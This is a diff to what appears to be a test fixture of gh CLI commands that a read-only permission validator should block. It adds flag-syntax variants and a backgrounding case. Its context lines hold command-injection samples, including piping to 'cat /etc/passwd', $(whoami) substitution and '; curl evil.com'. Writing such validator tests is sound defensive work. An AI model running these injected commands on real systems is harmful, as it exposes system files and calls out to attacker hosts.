@@ -61,9 +61,13 @@ gh api -X=DELETE /repos/owner/repo
 gh api -X PUT /repos/owner/repo
 gh api -X PATCH /repos/owner/repo
 gh api --input data.json /repos/owner/repo/issues
+gh api --input=data.json /repos/owner/repo/issues
 gh api -f title=test /repos/owner/repo/issues
+gh api -f=title /repos/owner/repo/issues
 gh api --field title=test /repos/owner/repo/issues
+gh api --field=title /repos/owner/repo/issues
 gh api -F file=@data.json /repos/owner/repo/issues
+gh api -F=file /repos/owner/repo/issues
 
 # GraphQL mutations (write operations)
 gh api graphql -f query="mutation { createIssue(input: {repositoryId: \"123\", title: \"test\"}) { issue { id } } }"
@@ -79,6 +83,7 @@ gh pr view 123 | cat /etc/passwd
 gh pr view $(whoami)
 gh pr view `whoami`
 gh pr view 123 & background_cmd
+gh pr view 123&malicious
 gh issue list; malicious_command
 gh api /repos/owner/repo; curl evil.com
 
